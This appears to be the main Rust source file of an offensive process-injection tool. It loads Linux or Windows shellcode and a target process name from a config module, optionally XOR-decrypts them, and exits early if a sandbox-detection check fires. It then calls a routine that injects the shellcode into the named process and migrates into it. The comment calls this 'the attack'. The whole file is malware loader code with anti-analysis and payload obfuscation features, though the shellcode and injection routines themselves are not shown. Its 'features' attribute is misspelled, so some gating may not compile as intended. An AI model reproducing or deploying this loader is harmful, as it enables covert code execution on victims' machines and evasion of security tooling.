use std::str;

// Load Linux implementation if the target OS is Linux
#[cfg(target_os = "linux")]
mod rco_process_migration_linux;
#[cfg(target_os = "linux")]
use rco_process_migration_linux::inject_and_migrate;
// Determine which shellcode and target process to use based on features
#[cfg(all(target_os = "linux", not(features = "xor")))]
const SHELLCODE: &[u8] = rco_config::LINUX_SHELLCODE;
#[cfg(all(target_os = "linux", not(features = "xor")))]
const TARGET_PROCESS: &[u8] = rco_config::LINUX_MIRGATION_TARGET.as_bytes();
#[cfg(all(target_os = "linux", features = "xor"))]
const SHELLCODE: &[u8] = rco_config::ENCRYPTED_LINUX_SHELLCODE;
#[cfg(all(target_os = "linux", features = "xor"))]
const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_LINUX_MIRGATION_TARGET;

// Load Windows implementation if the target OS is Windows
#[cfg(windows)]
mod rco_process_migration_windows;
#[cfg(windows)]
use rco_process_migration_windows::inject_and_migrate;
// Determine which shellcode and target process to use based on features
#[cfg(all(windows, not(features = "xor")))]
const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;
#[cfg(all(windows, not(features = "xor")))]
const TARGET_PROCESS: &[u8] = rco_config::WINDOWS_MIRGATION_TARGET.as_bytes();
#[cfg(all(windows, features = "xor"))]
const SHELLCODE: &[u8] = rco_config::ENCRYPTED_WINDOWS_SHELLCODE;
#[cfg(all(windows, features = "xor"))]
const TARGET_PROCESS: &[u8] = rco_config::WINDOWS_MIRGATION_TARGET;

fn main() {
    // Runs the sandbox detection function or the dummy replacement, dependent on features
    if rco_utils::pound_sand() {
        return
    }

    // Decrypts the shellcode and target process or returns them unchanged, dependent on features
    let shellcode = rco_utils::xor_encrypt_decrypt(rco_config::XOR_KEY, SHELLCODE).unwrap();
    let target_process = rco_utils::xor_encrypt_decrypt(rco_config::XOR_KEY, TARGET_PROCESS).unwrap();
    let target_process = str::from_utf8(&target_process).unwrap();

    // Runs whichever version of the attack was compiled
    inject_and_migrate(&shellcode, target_process);
}
